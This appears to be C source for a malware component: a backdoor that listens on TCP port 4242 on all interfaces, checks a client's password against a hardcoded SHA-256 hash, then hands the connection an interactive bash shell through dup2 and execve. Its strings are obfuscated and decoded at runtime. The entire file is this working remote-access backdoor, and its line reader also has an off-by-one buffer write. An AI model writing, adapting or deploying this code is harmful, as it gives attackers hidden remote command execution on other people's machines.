#include "constants.h"
#include "digest.h"
#include "mem.h"
#include "shield.h"
#include <errno.h>
#include <fcntl.h>
#include <netinet/in.h>
#include <signal.h>
#include <stddef.h>
#include <stdint.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <sys/socket.h>
#include <sys/wait.h>
#include <unistd.h>

#define PWD_SHA256 "1a7869273f5e2f8f572872a13cc6b2901762a24440b6b6a5715d894cd0135c61"

ssize_t
read_line(const int client_fd, char *const buf, size_t max_len) {
    size_t read_bytes;
    char c = 0;

    for (read_bytes = 0; read_bytes < max_len; ++read_bytes) {
        ssize_t recv_res = recv(client_fd, &c, 1, 0);
        if (recv_res == -1) {
            __log(stderr, "(recv [fd %d]) Error: %s\n", client_fd, strerror(errno));
            return -1;
        } else if (recv_res == 0) {
            __log(stderr, "(recv [fd %d]) Error: Connection closed while reading\n", client_fd);
            return 0;
        }

        if (c == '\n') {
            break;
        }
        if (c != '\r') {
            buf[read_bytes] = c;
        }
    }

    buf[read_bytes] = '\0';
    return read_bytes;
}

int
remote_shell_init(int client_fd, char **env) {
    char pwd_sha[65] = {0};
    while (1) {
        char buf[sizeof(PWD_SHA256) + 1] = {0};
        size_t read_bytes;
        if ((read_bytes = read_line(client_fd, buf, sizeof(buf))) <= 0) {
            goto client_error;
        }

        Sha256StreamingContext ctx = {0};
        sha256_stream_init(&ctx);
        sha256_stream_update(&ctx, (uint8_t *)buf, read_bytes);
        sha256_stream_final(&ctx, pwd_sha);
        if (ft_memcmp(PWD_SHA256, pwd_sha, sizeof(PWD_SHA256)) == 0) {
            if (send(client_fd, (char *)strings[LOGIN_SUCCESSFUL].data, 17, 0) == -1) {
                __log(stderr, "(send [fd %d]) Error: %s\n", client_fd, strerror(errno));
                goto client_error;
            }
            break;
        }

        // drain buffer until empty
        char discard[1024];
        while (recv(client_fd, discard, sizeof(discard), MSG_DONTWAIT) > 0)
            ;

        if (send(client_fd, (char *)strings[INVALID_PASSWORD_TRY_AGAIN].data, 28, 0) == -1) {
            __log(stderr, "(send [fd %d]) Error: %s\n", client_fd, strerror(errno));
            goto client_error;
        }
    }

    if (dup2(client_fd, STDIN_FILENO) == -1) {
        __log(stderr, "(dup2 [src_fd %d target_fd 0]) Error: %s\n", client_fd, strerror(errno));
        goto client_error;
    }
    if (dup2(client_fd, STDOUT_FILENO) == -1) {
        __log(stderr, "(dup2 [src_fd %d target_fd 1]) Error: %s\n", client_fd, strerror(errno));
        goto client_error;
    }
    if (dup2(client_fd, STDERR_FILENO) == -1) {
        __log(stderr, "(dup2 [src_fd %d target_fd 2]) Error: %s\n", client_fd, strerror(errno));
        goto client_error;
    }

    const char *bash_exec_path = (char *)strings[BIN_BASH].data;
    const char *args[2] = {bash_exec_path, NULL};

    execve(bash_exec_path, (char *const *)args, env);
    __log(stderr, "(execve [cmd %s]) Error: %s\n", bash_exec_path, strerror(errno));

client_error:
    close(client_fd);

    return 1;
}

int
remote_shell_listener_init(char **env) {
    int server_fd = -1, client_fd = -1;
    const struct sockaddr_in address = {.sin_family = AF_INET, .sin_addr.s_addr = INADDR_ANY, .sin_port = htons(4242)};

    decode_strings(strings, sizeof(strings) / sizeof(strings[0]));

    server_fd = socket(AF_INET, SOCK_STREAM, 0);

    if (bind(server_fd, (struct sockaddr *)&address, sizeof(address)) == -1) {
        __log(stderr, "(bind [fd %d]) Error: %s", server_fd, strerror(errno));
        close(server_fd);
        return -1;
    }
    if (listen(server_fd, 1) == -1) {
        __log(stderr, "(listen [fd %d]) Error: %s", server_fd, strerror(errno));
        close(server_fd);
        return -1;
    }

    int pids[MAX_CONNECTIONS] = {0};

    while (1) {
        if ((client_fd = accept(server_fd, NULL, NULL)) == -1) {
            __log(stderr, "(accept [fd %d]) Error: %s\n", server_fd, strerror(errno));
            close(server_fd);
            return -1;
        }

        for (int i = 0; i < MAX_CONNECTIONS; i++) {
            pid_t process_not_found = waitpid(pids[i], NULL, WNOHANG);
            if (process_not_found) pids[i] = 0;
        }

        int pid_free_index = -1;
        for (int i = 0; i < MAX_CONNECTIONS; i++) {
            if (pids[i] == 0) pid_free_index = i;
        }

        if (pid_free_index == -1) {
            __log(stderr, "(accept [fd %d]) Error: maximum connections already used\n", client_fd);
            if (send(client_fd, (char *)strings[TOO_MANY_CONNECTIONS].data, strings[TOO_MANY_CONNECTIONS].len, 0) == -1) {
                __log(stderr, "(send [fd %d]) Error: %s\n", client_fd, strerror(errno));
            }
            close(client_fd);
            continue;
        }

        int pid = fork();
        if (pid == -1) {
            __log(stderr, "(fork) Error: %s\n", strerror(errno));
            close(client_fd);
            continue;
        }
        if (pid != 0) {
            pids[pid_free_index] = pid;
            close(client_fd);
            continue;
        }

        remote_shell_init(client_fd, env);
        break;
    }

    close(server_fd);
    return 0;
}